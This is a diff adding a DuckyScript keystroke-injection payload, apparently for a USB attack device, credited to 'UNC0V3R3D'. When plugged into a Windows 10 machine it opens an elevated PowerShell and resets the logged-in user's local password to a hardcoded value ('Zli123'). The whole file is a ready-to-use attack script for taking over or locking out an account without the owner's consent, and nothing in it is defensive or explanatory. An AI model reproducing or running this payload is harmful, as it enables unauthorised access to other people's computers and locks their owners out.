@@ -1,0 +1,26 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Change Widnows 10 user password.
+REM Version: 1.0
+REM Category: Execution
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+ALTSTRING powershell Start-Process powershell -Verb runAs
+DELAY 1500
+ENTER
+DELAY 2000
+ALTSTRING $User = ([Environment]::UserName)
+ENTER
+DELAY 500
+ALTSTRING $NewPassword = ConvertTo-SecureString "Zli123" -AsPlainText -Force
+DELAY 300
+ENTER
+DELAY 500
+ALTSTRING Set-LocalUser -Name $User -Password $NewPassword
+DELAY 300
+ENTER
+DELAY 600
+ALTSTRING exit
+ENTER
